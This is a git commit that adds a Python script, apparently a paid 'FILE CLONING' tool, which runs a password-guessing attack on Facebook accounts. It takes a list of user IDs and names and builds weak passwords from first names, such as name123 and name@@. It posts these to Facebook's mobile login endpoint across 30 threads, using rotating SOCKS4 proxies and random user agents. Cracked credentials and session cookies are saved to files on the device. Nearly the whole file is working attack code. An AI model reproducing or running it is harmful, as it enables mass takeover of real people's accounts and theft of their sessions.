3290b46e62aa7e6e894365f5e01885593193b515
nipakhan0 <nipak8192@gmail.com>
2024-09-14 16:34:35 +0600

    Add files via upload

---
+++ Nipa.py
@@ -0,0 +1,413 @@
+import os 
+import uuid
+import mechanize
+import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
+from concurrent.futures import ThreadPoolExecutor as Ngangkang
+from datetime import datetime
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+import requests,zlib,platform
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
+from concurrent.futures import ThreadPoolExecutor as Ngangkang
+from datetime import datetime
+pretty.install()
+CON=sol()
+def tutulx(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tutulxz = '2009'
+		elif fx[:9] in ['100000000']       :tutulxz = '2009'
+		elif fx[:8] in ['10000000']        :tutulxz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tutulxz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tutulxz = '2010'
+		elif fx[:6] in ['100001']          :tutulxz = '2010/2011'
+		elif fx[:6] in ['100002','100003'] :tutulxz = '2011/2012'
+		elif fx[:6] in ['100004']          :tutulxz = '2012/2013'
+		elif fx[:6] in ['100005','100006'] :tutulxz = '2013/2014'
+		elif fx[:6] in ['100007','100008'] :tutulxz = '2014/2015'
+		elif fx[:6] in ['100009']          :tutulxz = '2015'
+		elif fx[:5] in ['10001']           :tutulxz = '2015/2016'
+		elif fx[:5] in ['10002']           :tutulxz = '2016/2017'
+		elif fx[:5] in ['10003']           :tutulxz = '2018/2019'
+		elif fx[:5] in ['10004']           :tutulxz = '2019'
+		elif fx[:5] in ['10005']           :tutulxz = '2020'
+		elif fx[:5] in ['10006','10007','10008']:tutulxz = '2021/2022'
+		else:tutulxz='2023'
+	elif len(fx) in [9,10]:
+		tutulxz = '2008/2009'
+	elif len(fx)==8:
+		tutulxz = '2007/2008'
+	elif len(fx)==7:
+		tutulxz = '2006/2007'
+	else:tutulxz='2023/2024'
+	return tutulxz
+	#============Time===========#
+import os, platform, time, sys
+class TUTUL:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.050)
+#TUTUL('\033[97;1m[\033[92;1m+\033[97;1m] \033[10;92mUPDATE CHECKING VERSION 16.9...? ')
+#time.sleep(5)
+#TUTUL('\033[97;1m[\033[92;1m+\033[97;1m] \033[10;92mSUCCESSFUL UPDATE DONE\n')
+#time.sleep(2)
+#os.system('clear')
+#TUTUL("\033[10;97m[\033[10;92m+\033[10;97m] \033[10;92mJOIN MY SCRIPT GIFT GROUP\n")
+#time.sleep(2)
+#os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
+#time.sleep(2)
+#TUTUL("\033[10;97m[\033[10;92m+\033[10;97m] \033[1;93mFOLLOW MY GITHUB\n")
+#time.sleep(2)
+#os.system(f'xdg-open https://github.com/Tutul-King')
+
+ #------------------[ Tutul-King ]-------------------#
+sys.stdout.write('\x1b[1;37m\x1b]2; Tutul King\x07')
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
+	#prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	open('.prox.txt','w').write(prox)
+except Exception as e:
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+	a='Mozilla/5.0 (Symbian/3; Series60/'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)
+	aa='Mozilla/5.0 (Linux; U; Android 4.2.2; fr-fr; Infinix X503 Build/JDQ39)'
+	b=(['2','3','4','5','6','7','8','9','10','11','12','13','14','15'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/534.30 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+def uaku():
+	try:
+		ua=open('bbnew.txt','r').read().splitlines()
+		for ub in ua:
+			ugen.append(ub)
+	except:
+		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
+		ua=open('.bbnew.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('.bbnew.txt','r').read().splitlines()
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+#________________COLOUR______________#
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[10;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\033[10;91m' #RED +
+k = '\033[10;93m' # KUNING +
+h = '\033[10;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[10;95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\033[10;96m' # BIRU -
+p = '\x1b[10;34m' # BIRU +
+asu = random.choice([m,k,h,u,b])
+def linex():
+    print(f'\033[10;97m----------------------------------')
+def clear():
+        os.system(f'clear')
+        print(logo)
+#----------------------------------#
+myid = uuid.uuid4().hex[:40].upper()
+idmy = uuid.uuid4().hex[:6].upper()
+try:
+    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
+except:
+    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
+    getx.write(myid+idmy)
+    getx.close()
+MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
+class apvroval:
+    def check():
+        url = "https://github.com/nipakhan0/Nipa142/blob/main/Nipa.txt"
+        import mechanize
+        my_awm = mechanize.Browser()
+        try:
+            host = my_awm.open(url)
+            check_key = str(host.read())
+            if MY_KEY in check_key:
+                login()
+            else:
+                clear()
+                logo2=(f"""\033[10;97m[\033[92;1m+\033[10;97m] \33[32;45m{MY_KEY}\033[0;92m""")
+                banner()
+                print(logo2)
+                print(f'\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mFREE-FIRE-ID CLONING\n\033[10;97m[\033[92;1m"\033[10;97m] \033[10;92mONLY ACTIVE ID CLONING\n\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mUnActive id Not AllowL\n\033[10;97m[\033[92;1m"\033[10;97m]\033[10;92m Cp id Login 60%\n\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mWi-fi Working 80%\033[10;97m')
+                input('\033[0;97m\033[10;97m[\033[92;1mÏ\033[10;97m]\33[10;92m PRESS ENTER TO SEND KEY\033[0;97m')
+                os.system('xdg-open https://wa.me/+8801607551776')
+                input('\033[0;97m\033[10;97m[\033[92;1mÏ\033[10;97m] \33[0;41mKEY COPY AND PRESS ENTER TO SEND ADMIN\033[0;97m')
+                os.system('xdg-open https://wa.me/+8801607551776')
+                time.sleep(59)
+        except Exception as e:
+            print(e)
+            exit()
+#----------------------------------------#
+
+def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def TUTULj(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
+def clear():
+	os.system('clear')
+def back():
+	login()
+	
+#_________[ LOGIN KEY ]______>>
+CorrectUsername = 'x' 
+key = 'true'
+while key == 'true':
+    username = input('\033[10;97m[\033[92;1m+\033[10;97m] \033[10;93mENTER YOUR LOGIN CODE \033[1;91m: \x1b[1;92m')
+    if username == CorrectUsername:
+            TUTUL('\033[10;97m[\033[92;1m+\033[10;97m] \033[10;92mSUCCESSFULLY DONE LOGIN BRO-!') 
+            time.sleep(1)           
+            key = 'false'
+os.system('clear')
+#------------------[ MAIN ]-----------------#
+#os.system('xdg-open https://www.facebook.com/Tutul.King.Ok.Bro')
+def banner():
+	os.system("clear")
+	print (f"""
+\033[0;92mTW
+Q\033[10;91m ˆˆˆ    ˆˆ  \033[0;92mˆˆ  \033[10;91mˆˆˆˆˆˆ   \033[0;92mˆˆˆˆˆ  \033[0;92mQ
+Q\033[10;91m ˆˆˆˆ   ˆˆ  \033[0;92mˆˆ  \033[10;91mˆˆ  ˆˆ  \033[0;92mˆˆ   ˆˆ \033[0;92mQ
+Q\033[10;91m ˆˆ ˆˆ  ˆˆ  \033[0;92mˆˆ  \033[10;91mˆˆˆˆˆˆ  \033[0;92mˆˆˆˆˆˆˆ \033[0;92mQ
+Q\033[10;91m ˆˆ  ˆˆ ˆˆ  \033[0;92mˆˆ  \033[10;91mˆˆ      \033[0;92mˆˆ   ˆˆ \033[0;92mQ
+Q\033[10;91m ˆˆ   ˆˆˆˆ  \033[0;92mˆˆ  \033[10;91mˆˆ      \033[0;92mˆˆ   ˆˆ \033[0;92mQ
+\033[0;92mZ]               \033[0;92m
+Q\033[10;91m">\33[0;41m[ WORKING WIFI+MOBILE DATA ]\033[0;92m\033[10;91m<"\033[0;92m\033[10;92mQ
+\033[0;94mTW\033[1;33m 
+\033[10;93m`PP[Author        " \33[1;38mNipa Khan ]  Q 
+\033[10;91m`PP[Facebook      " Nipa Khan ]  Q    
+\033[10;97m`PP[Github        " NipaKhan0 ]  Q   
+\033[10;94m`PP[Whatsapp      " 01607551776 ]Q 
+\033[10;95m`PP[TOOLS         " PAID ]       Q    
+\033[10;93m`PP[VERSION       " 0.1 ]        Q \033[10;92m
+\033[0;94mZ]\033[1;31m""")
+os.system('espeak -a 300 " Your,   Real,  Name,"')
+banner()
+NameX =input('\033[1;97m[\033[10;92m+\033[1;97m]\033[10;92m WHAT IS YOUR NAME \033[10;91m:\33[10;32m ')
+def login():
+	banner()
+	TUTULj('\033[1;97m----------------------------------')
+	print('\033[10;97m[\033[10;92m1\033[10;97m]\033[10;92m FILE CLONING\n\033[10;97m[\033[10;92m0\033[10;97m] \033[1;91mEXIT ')
+	TUTULj('\033[1;97m----------------------------------')
+	TUTUL= input('\033[10;92m\033[10;97m[\033[10;92m?\033[10;97m] \033[10;92mCHOOSE \033[10;91m:\033[10;92m ');time.sleep(0.01)
+	if TUTUL in ['m']:
+		public()
+	elif TUTUL in ['1']:
+		crack_file()
+	elif TUTUL in ['i','0i']:
+		result()
+	elif TUTUL in ['2','02']:
+		os.system('xdg-open https://wa.me/+8801611860222')
+	elif TUTUL in ['0']:
+		exit()
+	else:
+		TUTULj('  \033[10;97m[\033[10;92m?\033[10;97m] \033[10;91mINPUT WRONG')
+		time.sleep(2)
+		back()
+def crack_file():
+	os.system('clear')
+	banner()
+	os.system('espeak -a 300 " your file name"')
+	print('\033[1;32m\033[10;97m[\033[10;92m+\033[10;97m] [EXAMPLE \033[10;91m: \033[10;92m/sdcard/File.txt  Etc...]')
+	o = input('\033[10;97m[\033[10;92m+\033[10;97m]\x1b[38;5;208m YOUR FILE NAME \033[10;91m:\033[10;92m ')
+	try:lin = open(o).read().splitlines()
+	except:
+		TUTULj('\033[10;97m[\033[10;92m?\033[10;97m] \033[10;91mFile Not Found')
+		time.sleep(2)
+		back()
+	for xid in lin:
+		id.append(xid)
+	setting()
+def setting():
+	hu = '3'
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	print('\033[10;97m[\033[10;92m+\033[10;97m]\x1b[1;92m LOGIN LoVe\n\033[10;97m[\033[10;92m1\033[10;97m]\033[1;93m METHOD LoVe')
+	os.system('espeak -a 300 " 1,  method,  LoVe"')
+	hc = input('\033[10;97m[\033[10;92m+\033[10;97m]\033[10;92m CHOOSE \033[10;91m:\033[10;97m ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['9','09']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	passwrd()
+	exit()
+
+def passwrd():
+	os.system('clear')
+	banner()
+	TUTULj(f'\033[10;97m----------------------------------')
+	print(f"\033[10;97m[\033[10;92m+\033[10;97m]\x1b[38;5;208m USER NAME\033[10;91m :\033[10;96m "+NameX)
+	print('\033[10;97m[\033[10;92m+\033[10;97m] \033[10;92mTOTAL IDz :\033[10;97m '+str(len(id)))
+	print("\033[10;97m[\033[10;92m+\033[10;97m] \033[10;94mYOUR OK IDz SAVED\033[10;91m : \033[10;93m/sdcard/Tutul-Ok.txt")
+	print("\033[10;97m[\033[10;92m+\033[10;97m] \033[10;90mUSE FLIGHT MODE FOR SPEED UP AFTER\033[10;91m-\033[10;92m3 \033[10;90mMIN")
+	TUTULj(f'\033[10;97m----------------------------------')
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'1')
+					pwv.append(frs+'11')
+					pwv.append(frs+'12')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(nmf)
+					pwv.append('i love you')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'143')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'111')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(frs+'1')
+					pwv.append(frs+'11')
+					pwv.append(frs+'12')
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(nmf)
+					pwv.append('i love you')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'143')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'111')
+				pool.submit(crack,idf,pwv)
+	print('')
+	TUTULj('\n\033[10;97m[\033[10;92m+\033[10;97m]----------------------------------')
+	TUTULj('\033[10;97m[\033[10;92m+\033[10;97m] \033[10;96mCLONING COMPLETE BRO')
+	TUTULj(f'\033[10;97m[\033[10;92m+\033[10;97m] \033[10;92mCOMPLETE YOUR TOTAL OK IDz \033[10;91m:\033[10;92m {h}%s '%(ok))
+	TUTULj('\033[10;97m[\033[10;92m+\033[10;97m]----------------------------------')
+	input('\033[10;97m[\033[10;92m+\033[10;97m] \033[10;91mCLICK ENTER TO EXIT ')
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;97m[{bo}NIPA\033[10;97m]\033[1;90m>~{P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}-{P}[{h}Ok{P}-{bo}{ok}{P}] "),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks4://'+nip}
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;93m[Nipa-Cp] {idf} | {pw}')
+				os.system('espeak -a 300 " Cp"')
+				open('/sdcard/Nipa-Cp-id.txt', 'a').write(idf+' | '+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r\033[10;92m[Nipa-Ok=š] {idf} | {pw}\n\033[10;93m[<:] = COOKIES\033[10;91m : \033[10;92m{kuki}')
+				os.system('espeak -a 300 " Nipa,  Ok,  id"')
+				open('/sdcard/Nipa-Ok-id.txt', 'a').write(idf+' | '+pw+'\n[COOKIES] = '+kuki+'\n')
+				cek_apk(session,coki)
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.system('touch prox.txt')
+	except:pass
+
+#login()
+apvroval.check()
